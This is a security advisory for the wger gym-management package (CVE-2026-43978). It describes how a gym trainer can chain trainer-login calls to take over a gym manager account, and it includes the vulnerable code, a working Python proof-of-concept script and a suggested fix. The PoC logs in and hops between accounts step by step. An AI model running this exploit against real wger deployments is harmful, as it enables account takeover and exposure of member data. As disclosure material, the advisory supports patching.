# [H] wger: Privilege escalation via trainer-login session chaining allows gym trainer to impersonate gym manager

## Summary
Severity: High
Advisory: GHSA-9qpr-vc49-hqg2
CVE: CVE-2026-43978
CWE: CWE-269
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-9qpr-vc49-hqg2
Type: github-advisory

## Affected
- PyPI: `wger` — affected >=0

## Details
### Summary
A gym trainer can escalate their session to any higher-privileged account (gym manager, general manager) by chaining two calls to the trainer-login endpoint. Once a trainer performs a legitimate switch into a low-privileged user, the session flag `trainer.identity`
is set and this flag alone bypasses the permission check on all subsequent trainer-login calls, allowing the trainer to hop into any account including gym managers.

### Details
In `wger/core/views/user.py` lines 169–178, the permission check uses an AND condition:

```python
# Line 169 — passes if EITHER condition is false
if not request.user.has_perm('gym.gym_trainer') and not request.session.get('trainer.identity'):
    return HttpResponseForbidden()

# Line 173 — only runs when current user IS a trainer, not when identity is inherited
if request.user.has_perm('gym.gym_trainer') and (
    user.has_perm('gym.manage_gym') or user.has_perm('gym.manage_gyms')
):
    return HttpResponseForbidden()
```

After hop 1 (trainer → regular user), `request.user` is the regular user who has no `gym_trainer` permission, but `session['trainer.identity']` is set. Line 169 evaluates:
`not False AND not False` → the second operand short-circuits the check. Line 173 is never reached because the current user is no longer a trainer. The attacker can therefore call trainer-login again targeting a manager account and it succeeds.


### PoC
Requirements: A running wger instance with at least one gym trainer account and one gym manager account in the same gym.

```python
import requests

BASE = 'http://localhost:80'
s = requests.Session()

def whoami():
    r = s.get(f'{BASE}/api/v2/userprofile/',
              headers={'Accept': 'application/json'})
    return r.json().get('username')

# ─────────────────────────────────────────────
print("=" * 55)
print("  PoC: Trainer Login Privilege Escalation")
print("  wger/core/views/user.py:169")
print("=" * 55)

# ─── STEP 1: Normal login as gym trainer ─────
print("\n[STEP 1] Login as 'trainer1'")
print("         trainer1 has ONLY 'gym.gym_trainer' permission")

s.get(f'{BASE}/en/user/login')
s.post(f'{BASE}/en/user/login', data={
    'username': 'trainer1',
    'password': 'pass1234',
    'csrfmiddlewaretoken': s.cookies['csrftoken'],
})
print(f"         Current user  : {whoami()}")
print(f"         Permission    : gym.gym_trainer (NOT manage_gym)")

# ─── STEP 2: Legitimate trainer-login ────────
print("\n[STEP 2] trainer1 uses trainer-login to switch into 'regular1' (pk=4)")
print("         This is ALLOWED — trainer1 has gym_trainer permission")
print("         Side effect: session['trainer.identity'] = trainer1_pk")

s.get(f'{BASE}/en/user/4/trainer-login')
print(f"         Current user  : {whoami()}")
print(f"         Session flag  : trainer.identity is now SET")

# ─── STEP 3: EXPLOIT ─────────────────────────
print("\n[STEP 3] EXPLOIT — now as 'regular1', call trainer-login for 'manager1' (pk=3)")
print("         regular1 has ZERO permissions")
print("         BUT session['trainer.identity'] is set from Step 2")
print("         Line 169 check: `not has_perm() AND not session.get()` → BYPASSED")

s.get(f'{BASE}/en/user/3/trainer-login')
result = whoami()
print(f"         Current user  : {result}")

# ─── RESULT ──────────────────────────────────
print("\n" + "=" * 55)
if result == 'manager1':
    print("  RESULT : !! VULNERABLE !!")
    print("  trainer1 (gym_trainer) is now logged in as manager1")
    print("  manager1 has 'gym.manage_gym' — full gym admin access")
else:
    print("  RESULT : Not vulnerable (got: " + result + ")")
print("=" * 55)
```

Output on wger 2.5.0a2:

<img width="728" height="628" alt="image" src="https://github.com/user-attachments/assets/3e8affa3-4728-480c-bb57-929f66723ea5" />

### Impact
Any authenticated gym trainer can take over a gym manager or general gym manager account within the same gym. This grants full gym administration capabilities including viewing all member data, modifying contracts, managing gym configuration, and accessing other trainers' and managers' personal information.

### How to fix

The root cause is a logical error in wger/core/views/user.py at line 169. The AND operator means that if session['trainer.identity'] is set, the entire permission check is skipped — allowing any user who has previously been switched into to perform further trainer-login hops without holding the gym.gym_trainer permission themselves. Additionally, the target-user protection block at line 173 only executes when request.user is a trainer, so it never fires during a chained hop.

Vulnerable code (user.py:169–178):

```
if not request.user.has_perm('gym.gym_trainer') and not request.session.get('trainer.identity'):
    return HttpResponseForbidden()

if request.user.has_perm('gym.gym_trainer') and (
    user.has_perm('gym.gym_trainer')
    or user.has_perm('gym.manage_gym')
    or user.has_perm('gym.manage_gyms')
):
    return HttpResponseForbidden()
```

Suggested fix:

```
trainer_identity_pk = request.session.get('trainer.identity')

if not request.user.has_perm('gym.gym_trainer'):
    if not trainer_identity_pk:
        return HttpResponseForbidden()
    # Verify the original trainer in the session still holds the permission
    original_trainer = get_object_or_404(User, pk=trainer_identity_pk)
    if not original_trainer.has_perm('gym.gym_trainer'):
        return HttpResponseForbidden()

# Target-user check must apply in both direct and chained hop scenarios
if (request.user.has_perm('gym.gym_trainer') or trainer_identity_pk) and (
    user.has_perm('gym.gym_trainer')
    or user.has_perm('gym.manage_gym')
    or user.has_perm('gym.manage_gyms')
):
    return HttpResponseForbidden()
```

## References
- https://github.com/wger-project/wger/security/advisories/GHSA-9qpr-vc49-hqg2
- https://github.com/wger-project/wger
